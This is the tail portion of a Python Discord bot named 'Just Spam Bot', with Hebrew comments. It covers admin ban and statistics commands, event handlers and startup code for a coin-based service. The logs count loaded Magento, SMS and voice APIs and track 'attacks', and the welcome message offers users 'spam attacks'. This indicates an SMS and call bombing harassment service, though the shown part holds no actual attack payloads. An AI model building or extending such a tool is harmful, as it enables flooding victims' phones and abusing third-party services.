            description=f"{user.mention} has been banned",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        
        logger.info(f"Admin {ctx.author} banned {user}")
        
    except Exception as e:
        logger.error(f"Error in ban_command: {e}")
        await ctx.send("❌ An error occurred")

@commands.command(name="unban")
@commands.has_permissions(administrator=True)
async def unban_command(ctx, user: discord.User):
    """מסיר חסימה (אדמין בלבד)"""
    user_id = str(user.id)
    
    try:
        await users_col.update_one(
            {"user_id": user_id},
            {"$set": {"is_banned": False}}
        )
        
        embed = discord.Embed(
            title="✅ User Unbanned",
            description=f"{user.mention} has been unbanned",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
        
        logger.info(f"Admin {ctx.author} unbanned {user}")
        
    except Exception as e:
        logger.error(f"Error in unban_command: {e}")
        await ctx.send("❌ An error occurred")

@commands.command(name="adminstats")
@commands.has_permissions(administrator=True)
async def adminstats_command(ctx):
    """סטטיסטיקות אדמין"""
    try:
        total_users = await users_col.count_documents({})
        total_attacks = await attacks_col.count_documents({})
        total_transactions = await transactions_col.count_documents({})
        
        # סך כל המטבעות
        pipeline = [
            {"$group": {"_id": None, "total": {"$sum": "$coins"}}}
        ]
        result = await users_col.aggregate(pipeline).to_list(1)
        total_coins = result[0]["total"] if result else 0
        
        # משתמשים חדשים היום
        today_start = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
        new_today = await users_col.count_documents({
            "created_at": {"$gte": today_start.isoformat()}
        })
        
        embed = discord.Embed(
            title="👑 Admin Statistics",
            color=0x5865F2,
            timestamp=datetime.now()
        )
        embed.add_field(name="👥 Total Users", value=f"**{total_users}**", inline=True)
        embed.add_field(name="📅 New Today", value=f"**{new_today}**", inline=True)
        embed.add_field(name="💰 Total Coins", value=f"**{total_coins}**", inline=True)
        embed.add_field(name="🎯 Total Attacks", value=f"**{total_attacks}**", inline=True)
        embed.add_field(name="📝 Transactions", value=f"**{total_transactions}**", inline=True)
        embed.add_field(name="📡 APIs", value=f"**{len(APIS)}**", inline=True)
        
        await ctx.send(embed=embed)
        
    except Exception as e:
        logger.error(f"Error in adminstats_command: {e}")
        await ctx.send("❌ An error occurred")

# ========== אירועים ==========
@bot.event
async def on_ready():
    """כאשר הבוט מתחבר"""
    try:
        print(f"""
    ╔═══════════════════════════════════════╗
    ║     Just Spam Bot - Online!           ║
    ║         Version 2.0.0                  ║
    ║         © 2026 Just Spam               ║
    ╠═══════════════════════════════════════╣
    ║ User: {bot.user}                         ║
    ║ Servers: {len(bot.guilds)}                           ║
    ║ APIs: {len(APIS)}                             ║
    ╚═══════════════════════════════════════╝
        """)
        
        logger.info(f"🚀 Starting Just Spam Bot...")
        logger.info(f"✅ Connected to MongoDB on Railway")
        logger.info(f"✅ Logged in as {bot.user} (ID: {bot.user.id})")
        logger.info(f"✅ Total APIs loaded: {len(APIS)}")
        logger.info(f"✅ Magento APIs: {len(MAGENTO_APIS)}")
        logger.info(f"✅ SMS APIs: {len(SMS_APIS)}")
        logger.info(f"✅ Voice APIs: {len(VOICE_APIS)}")
        
        # עדכון סטטוס
        await bot.change_presence(
            status=discord.Status.online,
            activity=discord.Game(name="!panel | Just Spam © 2026")
        )
        
        # סנכרון פקודות
        await bot.tree.sync()
        logger.info("✅ Commands synced")
        
        # הוספת ה-Views הקבועים
        bot.add_view(SpamPanelView())
        bot.add_view(FreeCoinView())
        logger.info("✅ Views added")
        
    except Exception as e:
        logger.error(f"Error in on_ready: {e}")
        traceback.print_exc()

@bot.event
async def on_command_error(ctx, error):
    """טיפול בשגיאות פקודות"""
    if isinstance(error, commands.CommandNotFound):
        return
    
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("❌ You don't have permission to use this command")
        return
    
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"❌ Missing required argument: {error.param.name}")
        return
    
    if isinstance(error, commands.BadArgument):
        await ctx.send("❌ Invalid argument provided")
        return
    
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(f"❌ Command on cooldown. Try again in {error.retry_after:.2f}s")
        return
    
    logger.error(f"Command error: {error}")
    traceback.print_exc()
    await ctx.send(f"❌ An error occurred: {str(error)[:100]}")

@bot.event
async def on_message(message):
    """כאשר נשלחת הודעה"""
    if message.author.bot:
        return
    
    await bot.process_commands(message)

@bot.event
async def on_guild_join(guild):
    """כאשר הבוט מצטרף לשרת חדש"""
    logger.info(f"✅ Joined new guild: {guild.name} (ID: {guild.id})")
    
    # מציאת ערוץ כללי לשליחת הודעה
    for channel in guild.text_channels:
        if channel.permissions_for(guild.me).send_messages:
            embed = discord.Embed(
                title="🎉 Thanks for adding Just Spam Bot!",
                description="I'm here to help you with spam attacks!\n\n"
                            "**Get Started:**\n"
                            "• Type `!panel` to open the main panel\n"
                            "• Type `!freecoins` to claim free coins\n"
                            "• Type `!help` for all commands\n\n"
                            "⚠️ **Remember to use responsibly!**",
                color=0x00FF00
            )
            embed.set_footer(text="Just Spam © 2026")
            await channel.send(embed=embed)
            break

@bot.event
async def on_guild_remove(guild):
    """כאשר הבוט עוזב שרת"""
    logger.info(f"❌ Left guild: {guild.name} (ID: {guild.id})")

# ========== הרצת הבוט ==========
if __name__ == "__main__":
    try:
        # הגדרת uvloop לביצועים טובים יותר
        try:
            import uvloop
            uvloop.install()
            logger.info("✅ uvloop installed")
        except ImportError:
            logger.warning("⚠️ uvloop not installed, using default asyncio")
            pass
        
        # הגדרת אינטנטס
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        
        # יצירת הבוט
        bot = commands.Bot(
            command_prefix='!',
            intents=intents,
            help_command=None,
            case_insensitive=True
        )
        
        # הוספת הפקודות
        bot.add_command(panel_command)
        bot.add_command(freecoins_command)
        bot.add_command(balance_command)
        bot.add_command(referrals_command)
        bot.add_command(history_command)
        bot.add_command(stop_command)
        bot.add_command(stats_command)
        bot.add_command(leaderboard_command)
        bot.add_command(help_command)
        bot.add_command(addcoins_command)
        bot.add_command(removecoins_command)
        bot.add_command(createcoupon_command)
        bot.add_command(ban_command)
        bot.add_command(unban_command)
        bot.add_command(adminstats_command)
        
        # בדיקת טוקן
        if not TOKEN:
            logger.error("❌ DISCORD_TOKEN not found in environment variables!")
            logger.error("Please set your Discord bot token in the .env file")
            sys.exit(1)
        
        # הרצת הבוט
        logger.info("🚀 Starting Just Spam Bot...")
        bot.run(TOKEN, log_handler=None, reconnect=True)
        
    except KeyboardInterrupt:
        logger.info("🛑 Bot stopped by user")
        try:
            loop = asyncio.get_event_loop()
            loop.run_until_complete(bot.close())
        except:
            pass
        sys.exit(0)
    except discord.LoginFailure:
        logger.error("❌ Failed to login! Invalid token.")
        sys.exit(1)
    except discord.PrivilegedIntentsRequired:
        logger.error("❌ Privileged intents required! Please enable them in Discord Developer Portal.")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        traceback.print_exc()
        sys.exit(1)
